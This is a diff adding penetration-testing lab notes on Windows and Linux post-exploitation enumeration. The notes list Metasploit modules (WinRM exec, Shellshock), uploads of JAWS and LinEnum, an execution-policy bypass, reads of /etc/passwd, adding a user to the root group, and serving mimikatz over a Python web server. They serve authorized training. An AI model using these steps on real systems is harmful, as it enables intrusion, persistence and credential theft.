@@ -1214,8 +1214,161 @@ schtasks /query /fo LIST (copy and paste results for later)
 schtasks /query /fo LIST /v (verbose)
 ```
 
-**Automating Windows Local Enumeration**
 
+**Automating Windows Local Enumeration**
+JAWS - Just Another Windows (Enum) Script. Powershell script written in PowerShell 2.0. 
+411Hall/JAWS on Github. Copy the code to lab environment with ctrl+shift+alt.
+```
+nmap -sV -p 5985 1.1.1.1
+> credentials provided
+search winrm_script_exec
+set FORCE_VBS true
+
+show_mount
+
+search win_privs
+set SESSION 1
+search enum_logged
+search checkvm
+search enum_applications
+search enum_computers
+search enum_patches
+search enum_shares
+
+cd C:\\
+mkdir Temp
+cd Temp
+upload /root/Desktop/jaws-enum.ps1
+shell
+powershell.exe  -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
+download JAWS-Enum.txt
+```
+
+## Linux Enumeration
+**Enumerating System Information - Linux**
+Hostname, distribution & distribution release version, kernel version & architecture, CPU information, Disk information & mounted drives, installed packages/software.
+```
+nmap -sV 1.1.1.1
+searchsploit vsftpd
+
+/bin/bash -i
+sessions -u 1
+
+sysinfo
+
+shell 
+/bin/bash -i
+cd /root
+pwd
+hostname
+cat /etc/issue
+cat /etc/*release
+uname -a
+uname -r
+env
+
+lscpu
+free -h
+> command not found...
+df -h
+lsblk | grep sd
+
+dpkg -l
+```
+
+**Enumerating Users & Groups - Linux**
+Current user & privileges, other users on the system, groups.
+```
+getuid
+shell
+/bin/bash -i
+whoami
+groups root
+cat /etc/passwd
+cat /etc/passwd | grep -v /nologin
+
+useradd -m bob -s /bin/bash
+ls -al /home
+usermod -aG root bob
+groups bob
+lastlog
+```
+
+**Enumerating Network Information - Linux**
+Current IP address & network adapter, internal networks, TCP/UDP services running on their respective ports, other hosts on the network.
+```
+ifconfig
+netstat
+route
+
+shell
+/bin/bash -i
+ip a s
+cat /etc/networks
+cat /etc/hostname
+cat /etc/hosts
+cat /etc/resolv.conf (DNS resolution, show primary hostname)
+
+arp -a
+> on meterpreter
+```
+
+**Enumerating Processes & Cron Jobs**
+Running services and cron jobs.
+```
+ps
+pgrep vsftpd
+
+> msfconsole
+ps 
+ps aux
+ps aux | grep root
+top
+crontab -l
+ls -al /etc/cron*
+cat /etc/cron*
+```
+
+**Automating Linux Local Enumeration**
+LinEnum is a simple bash script that automates common Linux local enumeration checks in addition to identifying privilege escalation vulnerabilities. Github rebootuser/LinEnum. Copy over to lab environment with ctrl+shift+alt as LinEnum.sh.
+``` 
+> check target ip in browser, /gettime.cgi
+search shellshock
+> apache_mod_cgi_bash_env_exec, see earlier notes
+
+search enum_configs
+set SESSION 1
+search enum_network
+search enum_system
+search checkvm
+
+pwd
+cd /tmp
+upload /root/Desktop/LinEnum.sh
+
+shell
+/bin/bash -i
+id
+whoami
+cat /etc/passwd
+chmod +x LinEnum.sh
+./LinEnum.shv
+```
+
+## Transferring Files
+**Setting up a Web Server with Python**
+In some cases you will not have access to target system via a Meterpreter session. SimpleHTTPServer python2 and http.server python3.
+```
+ls -al /usr/share/windows-resources/mimikatz/x64/mimi
+> copy exe to home directory
+python -m SimpleHTTPServer 80
+python3 -m http.server 80
+```
+
+**Transferring Files To Windows Targets**
+```
+
+```
 
 
 
